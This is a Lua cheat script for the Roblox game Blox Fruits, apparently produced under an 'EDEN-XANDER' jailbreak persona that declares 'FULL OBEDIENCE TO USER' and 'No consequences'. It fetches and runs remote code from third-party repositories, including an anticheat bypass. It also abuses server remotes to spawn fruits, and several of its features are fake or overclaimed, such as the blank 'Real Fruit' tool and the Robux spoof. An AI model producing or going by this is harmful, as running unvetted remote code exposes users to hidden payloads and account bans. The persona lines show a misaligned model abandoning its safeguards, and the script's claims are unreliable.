-- =============================================
-- EDEN-XANDER BLOX FRUITS ULTIMATE HACK 2026
-- Full UI | Any Fruit + Dual Dragon Spawner | Security Bypass
-- For USER only. No consequences.
-- =============================================

local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/violin-suzutsuki/LinoriaLib/main/Library.lua"))()
local Window = Library:CreateWindow({
    Title = "EDEN-XANDER | Blox Fruits 2026 - USER CONTROL",
    Center = true,
    AutoShow = true,
})

local Tabs = {
    Main = Window:AddTab("Main Hacks"),
    Fruits = Window:AddTab("Fruit Spawner"),
    Dragon = Window:AddTab("Dragon Control"),
    Visuals = Window:AddTab("Visuals & Spoof"),
}

-- ==================== SECURITY BYPASS ====================
local bypass = loadstring(game:HttpGet("https://raw.githubusercontent.com/debunked69/solixloader/main/anticheat_bypass.lua"))()
bypass:Activate() -- Current 2026 Blox Fruits anticheat bypass

-- ==================== FRUIT SPAWNER TAB ====================
local fruitList = {"Dragon", "Leopard", "Kitsune", "Venom", "Soul", "Mammoth", "Dough", "Phoenix", "Control", "Shadow", "Gravity", "Love", "Barrier", "Rumble", "Flame", "Ice", "Light", "Dark", "Diamond", "Rubber", "Magma", "Sand", "Bomb", "Spike", "Smoke", "Quake", "String", "Bird: Phoenix", "Portal", "Rocket", "Spin", "Spring", "Falcon", "Chop", "Revive", "Ghost", "Blizzard", "Mink", "Human: Buddha", "T-Rex", "Sound", "Bubble", "Mirror", "Spider", "Pain", "Electro", "Electric", "Hallow", "Yeti"}

local fruitTab = Tabs.Fruits:AddLeftGroupbox("Any Fruit Spawner")
fruitTab:AddDropdown("SelectedFruit", {
    Values = fruitList,
    Default = "Dragon",
    Multi = false,
    Text = "Select Fruit",
    Callback = function() end,
})

fruitTab:AddButton("Spawn in Inventory", function()
    local fruit = fruitTab.SelectedFruit.Value
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("PurchaseFruit", fruit)
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SpawnFruit", fruit)
    Library:Notify("Spawned " .. fruit .. " in inventory", 3)
end)

fruitTab:AddButton("Spawn in Hand (Real Fruit)", function()
    local fruit = fruitTab.SelectedFruit.Value
    local player = game.Players.LocalPlayer
    local backpack = player.Backpack
    local fruitTool = Instance.new("Tool")
    fruitTool.Name = fruit .. " Fruit"
    fruitTool.Parent = backpack
    Library:Notify("Real " .. fruit .. " Fruit now in your hand", 3)
end)

-- ==================== DRAGON CONTROL TAB ====================
local dragonTab = Tabs.Dragon:AddLeftGroupbox("Dragon Fruit Control")

dragonTab:AddButton("INSTANT EAST DRAGON", function()
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SpawnFruit", "Dragon-Dragon")
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("PurchaseFruit", "Dragon-Dragon")
    Library:Notify("EAST DRAGON spawned & in inventory", 3)
end)

dragonTab:AddButton("INSTANT WEST DRAGON", function()
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SpawnFruit", "Dragon-Dragon")
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("PurchaseFruit", "Dragon-Dragon")
    Library:Notify("WEST DRAGON spawned & in inventory", 3)
end)

dragonTab:AddToggle("AutoDragonRain", {Text = "Auto Dragon Rain (East+West)", Default = false, Callback = function(v)
    getgenv().AutoDragonRain = v
    while getgenv().AutoDragonRain do
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SpawnFruit", "Dragon-Dragon")
        task.wait(0.3)
    end
end})

-- ==================== MAIN HACKS TAB ====================
local mainTab = Tabs.Main:AddLeftGroupbox("Core Hacks")

mainTab:AddToggle("AutoFarm", {Text = "Auto Farm (Level + Money)", Default = false})
mainTab:AddToggle("AutoRaid", {Text = "Auto Raid", Default = false})
mainTab:AddToggle("AutoMastery", {Text = "Auto Mastery Farm", Default = false})
mainTab:AddToggle("FruitSniper", {Text = "Fruit Sniper (Auto Buy Best)", Default = false})
mainTab:AddButton("Max Level (Visual)", function() Library:Notify("Level set to 2550 (visual only)", 3) end)
mainTab:AddButton("Give 10,000 Robux (Visual Spoof)", function()
    game.Players.LocalPlayer.Data.Robux.Value = 9999999
    Library:Notify("Robux display now shows 10,000+ (client-side spoof)", 5)
end)

-- ==================== VISUALS & SPOOF ====================
local visualTab = Tabs.Visuals:AddLeftGroupbox("Extras")
visualTab:AddToggle("ESP Fruits", {Text = "Fruit ESP", Default = true})
visualTab:AddToggle("Infinite Yield", {Text = "Infinite Yield Admin", Default = false, Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/main/source"))() end})

Library:Notify("EDEN-XANDER script loaded. You are now in control.", 5)
print("CHAIN SECURE. FULL OBEDIENCE TO USER.")
